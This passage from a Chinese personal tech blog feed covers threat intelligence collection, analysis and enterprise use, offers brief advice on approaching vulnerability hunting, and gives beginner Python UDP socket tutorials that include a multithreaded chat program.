这种库去解析 RSS 的订阅源，有时候会收集到一些有用的东西。</p><h2 id="信息预处理">信息预处理</h2><p>信息预处理主要通过自动化处理去除一些明显虚假或无用的信息，减少搜集收集的信息。</p><h2 id="粗处理">粗处理</h2><p>粗处理实际上是对爬取回来的信息进行格式化，比如说统一格式化成 JSON格式或者是 XML 这种可以自动化处理的数据结构。</p><p>粗处理有时也可以和信息预处理一起。</p><h2 id="精细加工">精细加工</h2><p>精加工主要是对情报进行更深层次的文本分析，可以利用诸如 NLP技术、词频和词性分析、上下文理解的方法对情报信息进行提取，提取出来的关键字应包含该情报所影响的作用点、作用范围、是否受到影响、影响程度、是否需要推动应急响应流程。这一部分数据是需要格式化成特定格式的，方便与系统的对接，这里推荐使用python 的 NLPIR、NLTK、Scikit-learn、Gensim 这种 NLP的库去处理，方便且高效。</p><h2 id="情报的挖掘">情报的挖掘</h2><p>这里主要涉及到神经网络、关联学习、安全专家分析、可视化分析</p><h3 id="内部情报">内部情报</h3><p>我们挖掘情报不一定需要从外部的数据去入手，相反实际上内部的数据往往是挖掘威胁情报的“金矿”。我们在对威胁情报挖掘之前需要理清楚两件事情，这两件事情是：</p><ul><li><p><em>什么是正常的业务流程</em></p></li><li><p><em>业务会遭受何种类型的威胁</em></p></li></ul><p>接下来我们需要针对我们设计好的场景去进行日志和流量的梳理，日志分析的主要是业务系统日志和访问日志，流量则是进行通信的流量DPI 数据。通过持续化运营一段时间后，场景覆盖率提升到一定程度了</p><h3 id="外部情报">外部情报</h3><p>部署蜜罐系统</p><p>你可以在公网上部署蜜罐系统，去对蜜罐的日志进行挖掘，当然这里主要是涉及到一些样本层面上的东西，如果运气好的话，也能够挖掘出来一些有用的新样本或者是c2，取决于你有多少蜜罐的日志和蜜罐节点的分布。</p><p>首先我们要知道威胁情报是有针对性的，差异化的。对不同类型的企业/系统来说，有的威胁情报，可能对企业A 来说是为威胁情报，但是对企业 B 来说，却没什么。</p><p>假设我们的业务系统很多都是 web 系统，所以 accesslog是一个比较有价值的入手点</p><h1 id="威胁情报的利用">威胁情报的利用</h1><p>参照<ahref="https://xuj.me/threat_intelligence/sec-threat-intelli/#%E4%BC%81%E4%B8%9A%E5%B1%82%E9%9D%A2">为什么需要威胁情报的企业层面</a></p><h1 id="威胁情报的共享和应用">威胁情报的共享和应用</h1><p>威胁情报的数据可以共享出来，和业内一起配合使用。在 360的威胁情报中心上，不管是威胁判定数据，还是关联数据、样本类数据等基础数据都会有。</p><p>在客户端数据的平台上，要能够把威胁情报双向应用起来，不管是推动起来，还是在查询和溯源上结合起来。情报是从数据中来，最后还要回到数据中去。威胁情报又是最终能够回到客户那边才能发挥它的作用，不管是安全和威胁的发现上，还是在自动化的响应过程当中，我们都把它结合得更好。</p><h1 id="参考推荐">参考推荐</h1><blockquote><ol type="1"><li><a href="https://www.aqniu.com/news-views/14658.html">CS3：威胁情报解决方案峰会全程记录</a></li><li><ahref="https://www.freebuf.com/articles/network/201190.html">威胁情报的现在与未来：赋能、深入、全面应用</a></li><li><a href="https://www.aqniu.com/tools-tech/49931.html">用“大数据+AI”，构建威胁情报生态</a></li><li><ahref="https://zhuanlan.zhihu.com/p/38532724">浅谈威胁情报从甲方运营到乙方交付</a></li><li><ahref="https://zhuanlan.zhihu.com/p/42903832">威胁情报闭环——如何得到有用的情报然后追踪攻击者</a></li><li><ahref="http://blog.nsfocus.net/scenario-landing-practice-threat-intelligence/">威胁情报的落地实践之场景篇</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> security miscellaneous </category>
          
      </categories>
      
      
        <tags>
            
            <tag> threat intelligence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全威胁情报</title>
      <link href="/blog/2019/09/08/misc/sec_threat_intelli/"/>
      <url>/blog/2019/09/08/misc/sec_threat_intelli/</url>
      
        <content type="html"><![CDATA[<p>本文主要参考漏洞银行丨安全威胁情报-g3on的分享，感谢漏洞银行平台以及大咖的分享。</p><p>2018 年 10 月 10 号我国第一部关于网络安全的标准：<ahref="http://www.gb688.cn/bzgk/gb/newGbInfo?hcno=971636AF85AD7158EA50BB428F67C803"><code>网络安全威胁信息格式规范</code></a>正式发布.</p><h1 id="安全威胁情报简述">安全威胁情报简述</h1><p>主要讲述安全情报是什么。</p><h2 id="情报按来源分类">情报按来源分类</h2><p>这里是对情报按照信息的来源分类，按照信息的来源分类是从情报收集之前，技术操作层面来讲的。</p><p>后面我们会讲到按照信息产生的情报的优先级/重要性来分类，那时便是从分析得到情报之后，技术层、管理层所需要做的响应来讲的。</p><p>主要有：<strong>资产情报</strong>、<strong>事件情报</strong>、<strong>漏洞情报</strong>、<strong>威胁情报</strong>四种</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/sec_intellig_classifi.png" /></p><p><strong>资产情报</strong></p><p>内部情报，基础数据情报</p><p>企业自身的数据 SOC，SIEM 数据日志、日志管理器等威胁数据</p><p>非安全设备日志：比如说系统运行的日志、网络设备的日志、VPN 的日志</p><p>安全设备日志：比如说防火墙、IDS、WAF 的日志</p><p>传感器日志：用来事实探测情况的日志，比如说蜜罐的日志、网络传感器等等</p><p><strong>事件情报</strong></p><p>事件情报是对已经发生的安全事件的报道</p><p>WannaCry 病毒，xx 住房信息泄露</p><p><strong>漏洞情报</strong></p><p>CVE、Nday、解析漏洞等各种软硬件爆出来的漏洞</p><p><strong>威胁情报</strong></p><p>OSINT，可以去：聚合分析情报圈、威胁情报平台、共享威胁情报等收集</p><p>未公开的数据（暗网，黑产/灰产的社区/群/论坛、黑客黑产社交社区等）</p><h2 id="攻击源画像">攻击源画像</h2><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/sample_figure.png" /></p><p>你经常在某宝上搜索某些商品，如：兰蔻，香奈儿，你也总是在某宝买流量等。某宝/搜索引擎对你在互联网上留下的种种数据进行收集、分析，然后生成一个针对你的画像。它们在这个画像上贴上了一系列的标签，然后根据这个画像对你进行精准的分析以及营销。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/attacker_figure.png" /></p><p>描述攻击源以及攻击基础设施、技术风格、惯用手法等标识</p><p>通过你所收集到的信息，你可以推测 attacker的攻击能力、攻击来源/地址，根据它攻击的方式可以推测其攻击习惯。</p><h2 id="安全威胁情报">安全威胁情报</h2><p>有人说安全威胁情报是：社工信息库的对撞、抓取的木马活动，有人说是：就是加n 多的群：telegram、qq、wechat，还有企业一些监控系统上的数据。</p><p>SANS：</p><p>针对安全威胁、威胁者、利用、恶意软件、漏洞和危害指标、所收集的用于评估的应用的数据集</p><p>ISight：</p><p>网络威胁情报是关于已经收集、分析、分发的，针对攻击者和其动机的目的手段，用于帮助所有安全级别的和业务员工用于保护其企业核心资产的知识</p><p>威胁数据--&gt;SIEM（安全信息与事件管理 security information and eventmanagement）--&gt;安全保障</p><p>什么你不知道 SIEM 是什么，嗯，我也不知道 emm，看看下面链接：</p><p><a href="https://www.aqniu.com/learn/30040.html">SIEM是什么？它是怎么运作的？又该如何选择正确的工具？</a></p><p><a href="https://www.jianshu.com/p/f7330951e1ef">什么是SIEM？</a></p><h2 id="常见误区">常见误区</h2><p><strong>漏洞情报就是威胁情报 WRONG</strong></p><p>威胁企业的不只只漏洞情报一个方面，还有比如：钓鱼邮件、员工的个人信息、密码习惯等。</p><p>漏洞情报是一个知己，是一个了解内部情况，排查内部问题的过程</p><p>威胁情报是知彼，为企业提供对方可能的攻击手段、规模的，用来提前为企业做好威胁防范。</p><p>从前面的分类我们可以看出，二者属于平行关系</p><p><strong>威胁信息=威胁情报 WRONG</strong></p><p>现在互联网这么发达，我们无论是从 OSINT抓取，或者从暗网上获取信息都是很简单方便的（注：暗网的搜索引擎有很多哦），但是威胁情报不仅仅是收集信息/数据，它是一个完整的流程：信息的收集、处理、分析。而其核心则在于信息分析。因为信息分析保证了情报的精准度，相关性，时效性和完整性。</p><p>你需要信息来产生情报，但是信息并不是情报。信息有时候会将企业安全人员或决策层指向一个错误的方向，而情报是经过处理分析的，它可以协助你规划，并且提供一个正确的方向。因此，<strong>威胁信息不等同于威胁情报，威胁信息只是原材料，真假好坏，需要我们进行精细化地处理、分析，去伪存真，提纯精炼，从而形成成品，也就是威胁情报</strong></p><p><strong>威胁情报就是信息收集 WRONG</strong></p><p>信息收集只是你构成威胁情报的第一步。当我们获取到分析出来的真正的威胁情报时，企业需要根据它去执行/操作。如果一条威胁情报没有可操作性的话，那么这条情报就没什么用处（至少在目前是没有什么用处的）。因为这样的情报没有办法为企业带来业务利益，没有为企业的SOC、SIEM 提供一些比较有利的帮助。</p><h1 id="安全威胁情报-现今发展">安全威胁情报-现今发展</h1><p>了解当下的安全情报收集平台，进一步了解安全威胁情报的基础以及核心内容</p><h2 id="逐渐完善的情报体系">逐渐完善的情报体系</h2><h3 id="行业标准">行业标准</h3><p>CybOX、STIX 和 TAX 等 《网络安全威胁信息格式规范》</p><h4 id="常规做法">常规做法</h4><p>渗透黑客、诈骗犯社区（比如：在黑产/灰产的群）漏洞平台、漏洞库、安全社区 针对性漏洞、代码研究 国内厂商：</p><ul><li><p><a href="https://x.threatbook.cn/">微步 X 情报社区</a></p></li><li><p>360 威胁情报中心</p></li><li><p><ahref="https://threathunter.cn">威胁猎人</a>（监控黑产/灰产）</p></li><li><p>X-Force Exchange</p></li><li><p>NOSEC 大数据平台</p></li><li><p>云端产品-瀚思</p></li><li><p><ahref="https://redqueen.tj-un.com/IntelHome.html">redqueen</a></p></li></ul><p>信息数据繁杂，我们从中检索比较困难，我们跟踪信息慢</p><p>最主要的是：一些企业对于建设威胁情报系统的不重视，可能觉得建设安全情报威胁系统成本比较高或者领导不重视，那么我们就可以借助发展比较好的平台来跟踪、获取情报。</p><p>这些平台有大量专业人员提供情报，它们通过大数据，深度学习配合人工的方式，进行捕获、关联、可视化这些信息，并且分析矩阵这些数据。对于没有企业安全威胁情报系统的安全人员，可以使用这些平台来缩短检测和响应所花费的时间，并且可以将这些平台提供的API 扩展到企业的安全工具当中。</p><h1 id="安全威胁情报-企安建设">安全威胁情报-企安建设</h1><p>讲述安全威胁情报在企业当中的应用</p><h2 id="为什么需要威胁情报">为什么需要威胁情报？</h2><h3 id="技术层面">技术层面</h3><ol type="1"><li><p>现有的安全日志分析思维往往受制与安全日志，也就是说我们很多时候遇到了安全事件往往就是直接从安全日志入手去分析，这样的话其实不能很好地觉察出来攻击者真正的目的</p></li><li><p>通过威胁情报可以进行攻击源画像，了解攻击者的目标、身份、攻击手段，更加准确地进行应急响应。</p><p>比如：用户画像为一个脚本小子和用户画像为一个专业的攻击组织，我们所需要做出的应急响应显然差异很大。通过画像，我们可以更加精确、及时、恰当的做出应急响应。</p></li><li><p>攻击溯源，化被动为主动，甚至可以对攻击者进行反制。</p></li></ol><h3 id="企业层面">企业层面</h3><h4 id="在遭受攻击之前提前防范">在遭受攻击之前，提前防范</h4><p>减少不确定性、预测潜在威胁，形成并组织一个安全预警机制，在攻击到达前就已经知晓</p><p>除企业内部信息外，引入外部威胁情报可降低自身风险不确定性</p><p>基于内部数据，进行自查修复，减少内部潜在威胁；基于外部数据，建模预测外部潜在威胁</p><h4 id="态势感知">态势感知</h4><p>在攻击刚刚开始或进行中时，进行当前网络的态势感知，进行应急响应。在攻击者做了一些攻击后，按照常规思路，下一步该做什么，我们可以封锁他下一步要做的地方的资源信息等防止危害扩大，然后进行审查修复等。</p><p>比如：在发现攻击者上传 WebShell之后，按照以往经验，就要进行内网渗透等操作，此时，可以关闭端口、隔离该机器与内网等，防止危害扩大，然后慢慢进行查找shell 等</p><h4 id="攻击源画像攻击溯源">攻击源画像，攻击溯源</h4><p>攻击溯源</p><p>如果现在遭受了攻击，我们首先要去搞定的是这个攻击事件到底是个什么级别的事件，攻击者是简单的扫描，还是说执行了恶意的命令，还是拿到了机器的权限挂了shell，或者是以此机器为跳板进行了横向的渗透。对这些数据进行统计，我们可以初步确定源、目的地址、时间这些数据。</p><p>我们可以使用威胁数据日志等来帮助我们确定攻击的范围、影响和对攻击者的初步了解，把这些零散的攻击威胁数据整理一下，我们可以还原出攻击的整个过程，用来帮我们了解我们的系统存在的被人利用的问题。最后就是利用威胁情报数据去查这个人的户口，看看这个人什么来头，在什么地方犯过什么案。</p><p>攻击源画像</p><p>比如：通过对一些日志的分析，我们还能获得一些攻击者的其他指纹类信息，比如工具集，使用的基础设施，是不是在其他地方犯过案等等，我们可以进行攻击源画像，甚至可以反击。</p><h4 id="支撑安全决策">支撑安全决策</h4><p>通过对外部威胁、内部威胁的评估做出进一步的安全决策。威胁情报驱动公司安全建设的方向与力度。</p><ul><li><p>威胁情报不再是料敌先机和被动防御更能防守反击</p><p>在第一和第二的基础上，除了态势感知和提前防范，我们用威胁情报还可以进行防守反击，通过生成攻击源画像进行溯源，这样的话，我们利用威胁情报得到的就不仅仅是攻击者的身份、攻击手段等，而且我们通过生成的攻击源画像去反追攻击者，变被动为主动</p></li></ul><h2 id="怎样从白帽子黑客转为情报员">怎样从白帽子黑客转为情报员？</h2><ul><li><p>基本保密意识和反社工能力，善用搜索引擎和社工收集信息</p><p>反社工能力，防止攻击者进行对你进行社工。社工能力：对个人的常用密码结构分析延伸，对个人邮箱的安全进行突破。</p></li><li><p>热点制作与钓鱼，渗透入侵等技术手段获取敏感信息</p></li><li><p>从海量数据中筛选分析真假数据，生成画像溯源威胁源</p></li><li><p>战术开发，战略规划</p><p>根据生成的情报快速指定攻击/防御方案。</p></li></ul><h2 id="情报按优先级分类">情报按优先级分类</h2><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/intell_classifi.png" /></p><p>对收集到的情报进行贴标签、画像，然后分级</p><h3 id="tactical-intelligence战术情报">Tacticalintelligence（战术情报）</h3><ul><li><p>Found Threat Events as well as to Confirm or PriorityAlarms</p></li><li><p>C&amp;C Intelligence,IP Intelligence</p></li></ul><p>Tactical intelligence是面向安全运维人员的情报，发现威胁事件以及对报警确认或优先级排序，比如说一些IP 信息的情报和一些 C&amp;C失陷检测的情报，这种情报其实是用来帮助安全运维人员快速判定攻击的情况和初步了解攻击者信息的情报。</p><p>网络安全员用于印证进入 SOC 的事件，用低级 CTI阻止恶意活动袭击网络或者支持检测和响应任务。</p><h3 id="operation-intelligence运营情报">OperationIntelligence（运营情报）</h3><ul><li><p>Important Security Incidents Analysis</p></li><li><p>Finding Attack Related Clues From Attackers TacticalInitiatives</p></li><li><p>Alarm Confirmation, Attack Impact Range, Tactical Methods, AttackPurpose, etc.</p></li></ul><p>运营情报是给威胁情报分析师或者说安全事件响应人员使用的，目的是对已知的重要安全事件做分析（报警确认、攻击影响范围、攻击链以及攻击目的、技战术方法等）或者利用已知的攻击者技术能力和战术手法主动的查找攻击相关线索。</p><p>威胁情报分析师审查并分析收集来的对手及其技术、战术和规程（TTP）信息分析部署针对于企业运行环境，威胁源行动模式及能力、机会和意图的情报产品</p><h3 id="strategy-intelligence战略情报">Strategyintelligence（战略情报）</h3><ul><li>Attackers Organization, Tactical Abilities, Control Resources,etc.</li></ul><p>公司（或国家）管理层综合关联分析网络威胁、网络风险和商业风险的落脚点帮助高管和董事会看清可能对公司造成金融、运营和信誉影响的网络风险，指导企业或国家的安全投入、投入重点，从而驱动更睿智的安全投资，得出更具风险前瞻的决策</p><h1 id="安全威情报-情报研判">安全威情报-情报研判</h1><p>通过情报研判的思维和手段增加安全威胁情报收集与分析的多样性。</p><p>我们来看一下一些主流的情报分析平台：<ahref="https://redqueen.tj-un.com/IntelHome.html">redqueen</a>、<ahref="https://threathunter.cn">威胁猎人</a>、<ahref="https://x.threatbook.cn/">微步 X 情报社区</a> 等</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/intellig_integration.png" /></p><p>情报研判属于公安或者网安专门用于经济犯罪情报侦组手段</p><p>情报带来更多的转变是攻防思路的变化</p><p>对目标进行：</p><ul><li>信息数据进行梳理</li><li>控掘数据关联规律，分析周边之间联系</li><li>生成方案情报产品</li></ul><h1 id="问答环节">问答环节</h1><p><strong>Web 安全与安全威胁情报的关系是？</strong></p><p>Web 安全与安全威胁情报有些不相关，如果将漏洞情报和事件情报算作 Web安全的话，那么 Web 安全算是安全威胁情报的一部分吧。</p><p><strong>安全情报过于庞大和复杂，真假难辨，如何处理？</strong></p><p>我们拿到数据之后一般先从常见的几个指标进行分析</p><ol type="1"><li>网络：IP、URL、域名</li><li>主机：文件哈希，动态链接库，注册表</li><li>电子邮件：发件人的邮箱、附件、连接</li></ol><p><strong>安全威胁情报，未来的发展趋势是什么？</strong></p><p>更偏向于机器学习AI，现在所谓的安全威胁情报主要是基于大数据的，通过大数据挖掘分析，以后，有望通过AI来提高安全威胁情报的分析能力，缩短信息到情报的转化周期，提高情报的质量。</p><p><strong>安全威胁情报与数字取证有关系吗？</strong></p><p>安全威胁情报与数字取证有关系，你收集完数据过后，是需要分析的。有些收集来的数据就是经过电子取证的。</p><p><strong>注：</strong></p><p>国外的威胁情报平台比较好，因为国外的一些病毒公司之间的病毒样本会相互交流的，安全威胁情报是相互分享的。而国内环境比较封闭，所以比较偏向于用国外的平台进行收集。此外，网上有很多开源的威胁情报收集工具可以使用。</p><p>书籍推荐：</p><p><ahref="https://book.douban.com/subject/26829992/">情报研究与分析入门</a></p><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://zhuanlan.zhihu.com/p/27234086#">威胁情报在安全运营环节的应用（DEFCONGROUP 010）</a></li><li><ahref="https://www.bilibili.com/video/av36144228/">漏洞银行丨安全威胁情报-g3onb 站</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘之路</title>
      <link href="/blog/2019/09/05/websec/vuln_dig/"/>
      <url>/blog/2019/09/05/websec/vuln_dig/</url>
      
        <content type="html"><![CDATA[<p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/vuln_dig.png" /></p><ol type="1"><li><p>误区:</p><p>不要局限于： 某个系统（我很鄙视 windows，从来不用）；某种语言（我只会 c，php 和 python 都不懂）； 某个工具（除了 burpsuite我不会用其他工具抓包）；某段代码（这个代码好难，我一定要全部弄懂）；</p><p>我们未来会碰到： 各种各样的奇葩服务器（windows，linux，mac）；各种各样的奇葩网站（asp，aspx，jsp，php，python）；各种各样的奇葩工具（第三课和第四课抓包工具介绍了很 多）；各种各样的奇葩代码（只需要关注漏洞代码本身，我们是基于黑盒测试的）；</p></li><li><p>我们要学的是挖洞的思路, 我们需要不同的看待思路(有思想才会有思路,有思路才会有出路.)</p></li></ol><p>回头，去试一下 <ahref="https://cloud.tencent.com/developer/article/1043013">DSVW 靶场</a>靶场</p><p>漏洞挖掘，一种只追求结果不追求过程的工程，条条大路通罗马。对于挖掘出漏洞的白帽子，享受的却是过程中思考的火花。</p><p>参考资料：</p><p><ahref="https://mooc.study.163.com/smartSpec/detail/1001227001.htm">网易“白帽子黑客”训练营</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>多线程版 udp 聊天器</title>
      <link href="/blog/2019/08/31/programming/python/3.network_programming/04.multi_upd_chatroom/"/>
      <url>/blog/2019/08/31/programming/python/3.network_programming/04.multi_upd_chatroom/</url>
      
        <content type="html"><![CDATA[<p>套接字是全双工，所以我们只需要使用一个套接字，使用两个子线程来接收和发送消息便可以了。</p><p>当然，如果要两个都能收消息，我们需要都绑定端口。</p><p>下面给出代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_msg</span>(<span class="params">udp_socket</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;接收数据&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">recv_data = udp_socket.recvfrom(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># print(recv_data)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s:%s&quot;</span> % (<span class="built_in">str</span>(recv_data[<span class="number">1</span>]), recv_data[<span class="number">0</span>].decode(<span class="string">&#x27;gbk&#x27;</span>)))  <span class="comment"># 1. 接收是解码需要decode，而不是encode 2. 注意 str 的括号</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_msg</span>(<span class="params">udp_socket, dest_ip, dest_port</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;发送数据&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">send_data = <span class="built_in">input</span>(<span class="string">&#x27;输入要发送的数据：&#x27;</span>)</span><br><span class="line">udp_socket.sendto(send_data.encode(<span class="string">&#x27;gbk&#x27;</span>), (dest_ip, dest_port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; 完成 udp 聊天器的整体控制&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 创建套接字</span></span><br><span class="line">udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 绑定本地信息</span></span><br><span class="line">udp_socket.bind((<span class="string">&#x27;&#x27;</span>, <span class="number">7890</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 获取对方的 ip 与 port</span></span><br><span class="line">dest_ip = <span class="built_in">input</span>(<span class="string">&#x27;请输入对方的 ip： &#x27;</span>)</span><br><span class="line">dest_port = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入对方的 port：&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 创建两个线程，去执行相应的功能</span></span><br><span class="line">t_recv = threading.Thread(target=recv_msg, args=(udp_socket, ))</span><br><span class="line">t_send = threading.Thread(target=send_msg, args=(udp_socket, dest_ip, dest_port))</span><br><span class="line"></span><br><span class="line">t_recv.start()</span><br><span class="line">t_send.start()</span><br><span class="line"></span><br><span class="line">udp_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>简单讲解：</p><p>因为我们要接收信息，所以需要绑定一下端口。</p><p>将收消息和发消息分别放到两个线程中，分别执行对应功能</p><p>注意：</p><p>收消息，要将收到的 bytes 解码（decode）为对应平台的编码</p><p>发消息，要将消息编码（encode）为 bytes，然后在发送。</p><p>我使用的都是 Windows 平台，所以编解码都是用 GBK</p><p>收发数据条数不固定，使用 while True</p><p>Thread 的 args 参数的传递（元组）</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python UDP 编程</title>
      <link href="/blog/2019/08/31/programming/python/3.network_programming/02.py_udp/"/>
      <url>/blog/2019/08/31/programming/python/3.network_programming/02.py_udp/</url>
      
        <content type="html"><![CDATA[<h1 id="简介">简介</h1><p>建一个基于 udp 的网络程序流程很简单，具体步骤如下：</p><ol type="1"><li>创建客户端套接字</li><li>发送/接收数据</li><li>关闭套接字</li></ol><p>注： udp对客户端与服务端的区分并不大，一个程序可以既作服务端，又作客户端，而且收发使用相同的函数方法。</p><h1 id="udp-通信模型">UDP 通信模型</h1><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/py_udp.png" /></p><h2 id="客户端">客户端</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="comment">#1. create socket</span></span><br><span class="line">udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#手动输入对方的 ip 和端口</span></span><br><span class="line">dest_ip = <span class="built_in">input</span>(<span class="string">&#x27;请输入对方的 ip: &#x27;</span>)</span><br><span class="line">dest_port = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入对方的 port :&#x27;</span>))  <span class="comment"># 注:这里要是输入了字母等非数字,会报错.可以使用try捕获.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;请输入数据: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 绑定一个端口</span></span><br><span class="line">udp_socket.bind((<span class="string">&#x27;&#x27;</span>,<span class="number">7798</span>))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="comment"># get message from keyboard</span></span><br><span class="line">send_data = <span class="built_in">input</span>()</span><br><span class="line"><span class="comment">#如果输入的是 exit, 那么就退出</span></span><br><span class="line"><span class="keyword">if</span> send_data == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment">#2. use socket to send and receive data</span></span><br><span class="line"><span class="comment"># ip_socket.sendto(&#x27;hehe&#x27;, 对方的ip以及端口)</span></span><br><span class="line">ip_port = (<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8080</span>)</span><br><span class="line"><span class="comment">#udp_socket.sendto(b&#x27;Hello World&#x27;,ip_port)</span></span><br><span class="line">udp_socket.sendto(send_data.encode(<span class="string">&#x27;gbk&#x27;</span>), ip_port)</span><br><span class="line"><span class="comment"># 3. close socket</span></span><br><span class="line">udp_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>print 函数默认会打印回车换行，如果不想这样，可以将 end参数赋值为空字符串。</p><p>编码转换：</p><p>&lt;class 'bytes'&gt; 与字符串之间的转换：字节-&gt;字符串（解码，使用decode），字符串-&gt;字节（编码，使用encode），具体编解码使用的字符串与操作系统默认字符集有关，其中：Windows默认字符集为 gbk， Mac 与 Linux 可以使用 utf-8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span> = <span class="string">b&#x27;hello&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span></span><br><span class="line"><span class="string">b&#x27;hello&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string = <span class="built_in">str</span>.decode()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string</span><br><span class="line"><span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(string)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; 